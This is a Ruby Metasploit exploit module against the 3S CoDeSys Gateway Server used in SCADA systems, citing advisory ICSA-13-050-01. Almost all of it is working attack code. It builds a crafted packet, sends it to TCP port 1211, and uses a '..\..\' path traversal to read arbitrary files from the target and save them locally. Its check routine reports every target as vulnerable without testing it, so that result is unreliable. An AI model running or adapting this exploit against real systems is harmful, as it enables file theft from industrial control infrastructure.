#!/usr/bin/env ruby

require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
    
    Rank = ExcellentRanking
    include Msf::Exploit::EXE
    include Msf::Exploit::FileDropper
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::WbemExec
    
    def initialize(info = {})
        super(update_info(info,
                          'Name' => 'SCADA 3S CoDeSys Gateway Server Arbitrary File Read',
                          'Description' => %q{
                            This module exploits arbitrary file read within the SCADA system
                            },
                          'Author' =>
                                [
                                    'Enrique Sanchez <esanchez@accuvant.com>' 
                                   ],
                          'License' => 'MSF_LICENSE',
                          'References' =>
                                [
                                    ['ICSA-13-050-01', '02-19-2013']
                                ],
                          'Platform' => 'win',
                          'Targets' =>
                            [
                                ['Windows Universal S3 CoDeSyS < 2.3.9.27', { }]
                            ],
                          'DefaultTarget' => 0
                          ))
        
        register_options(
            [
                Opt::RPORT(1211),
                OptString.new('FILEPATH', [false, 'Path to file']),
                OptString.new('FILENAME', [true, 'Filename to read']),
                OptString.new('LOCALPATH', [true, 'Local filepath to store the file'])
            ], self.class
        )
    end
        
    def check
        return Exploit::CheckCode::Vulnerable
    end
        
    def read_file(filepath, filename, localpath)
        magic_code = "\xdd\xdd"
        remote_file = nil
        
        if filepath == nil
            filepath = ""
        end
        
        if localpath[-1, 1] != '/'
            localpath << '/'
        end
        
        pkt = magic_code << "AAAAAAAAAAAA" << [0x100].pack("L")
        print_debug("pkt.size is #{pkt.size}")
        opcode = [4].pack("L")
        
        file = "..\\..\\" << filepath << filename << "\x00"
        print_debug("File to read is #{file}")
        tmp_pkt = opcode << file
        pkt << tmp_pkt << "X" * (0x100 - tmp_pkt.size)
        print_debug(pkt.size)
        print_debug(pkt)
        connect
        sock.put(pkt)
        begin
            ::Timeout.timeout( 5 ) do
                remote_file = sock.read(2000)
            end
        rescue ::Timeout::Error
        end
        
        if remote_file != nil
            f = File.new("#{localpath}/#{filename}",  "w")
            # trim 14 chars since that is part of the SCADA response, this allows to retrieve valid binaries
            f.write(remote_file[14..-1])
            f.close
            print_debug("remote file: #{remote_file[14..-1]}")
        end
    end
        
    def exploit
        print_status("- Attempting to communicate with SCADA system #{rhost} on port #{rport}")
        
        read_file(datastore['FILEPATH'], datastore['FILENAME'], datastore['LOCALPATH'])
    end
end
